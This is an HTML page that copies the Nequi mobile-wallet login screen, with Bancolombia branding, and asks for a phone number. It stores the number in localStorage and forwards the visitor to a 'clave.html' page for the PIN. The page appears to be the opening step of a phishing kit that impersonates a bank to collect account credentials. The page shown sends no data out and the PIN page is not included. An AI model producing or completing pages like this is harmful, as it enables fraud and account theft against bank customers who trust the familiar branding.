<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Nequi</title>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap');
    
    * { margin:0; padding:0; box-sizing:border-box; }
    body { 
      font-family: 'Roboto', sans-serif; 
      background: #1F0A2E;
      height: 100vh; 
      color: white;
      overflow: hidden;
    }
    .container {
      max-width: 420px;
      margin: 0 auto;
      padding: 20px;
      height: 100vh;
      display: flex;
      flex-direction: column;
      background: linear-gradient(#2C0B3A, #1F0A2E);
    }

    .top-bar {
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding: 10px 0 20px 0;
    }
    .bancolombia-logo {
      font-size: 22px;
      font-weight: 700;
      color: #FF2D95;
    }
    .help {
      width: 28px; 
      height: 28px;
      border: 2px solid #FFFFFF;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 17px;
      color: white;
    }

    .nequi-logo {
      text-align: center;
      font-size: 54px;
      font-weight: 700;
      margin: 60px 0 90px 0;
      color: white;
    }
    .nequi-logo span { color: #FF2D95; }

    .label {
      text-align: center;
      font-size: 17px;
      margin-bottom: 25px;
      color: #E0C0FF;
    }

    .input-wrapper {
      background: #2A1840;
      border: 2px solid #2A1840;     /* Mismo color del centro */
      border-radius: 12px;
      padding: 4px;
    }

    input {
      width: 100%;
      background: #2A1840;
      color: white;
      border: none;
      border-radius: 10px;
      padding: 18px 20px;
      font-size: 17.5px;
      outline: none;
    }
    input::placeholder {
      color: #B89ED4;
    }

    /* Fix fuerte para autocompletado */
    input:-webkit-autofill,
    input:-webkit-autofill:hover,
    input:-webkit-autofill:focus {
      -webkit-text-fill-color: white !important;
      -webkit-box-shadow: 0 0 0 30px #2A1840 inset !important;
      background-color: #2A1840 !important;
    }

    button {
      margin-top: auto;
      height: 58px;
      background: #FF2D95;
      color: white;
      border: none;
      border-radius: 12px;
      font-size: 17px;
      font-weight: 500;
      box-shadow: 0 5px 15px rgba(255, 45, 149, 0.35);
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="top-bar">
      <div class="bancolombia-logo">bancolombia</div>
      <div class="help">?</div>
    </div>

    <div class="nequi-logo">Nequi <span>■</span></div>
    
    <div class="label">Ingresa tu número de celular</div>

    <div class="input-wrapper">
      <input type="tel" id="phone" placeholder="300 123 4567" maxlength="10" inputmode="numeric">
    </div>

    <button onclick="nextScreen()">Entra</button>
  </div>

  <script>
    function nextScreen() {
      const phone = document.getElementById("phone").value.trim();
      if (phone.length < 10) {
        alert("Por favor ingresa un número de celular válido");
        return;
      }
      localStorage.setItem("phone", phone);
      window.location.href = "clave.html";
    }
  </script>
</body>
</html>
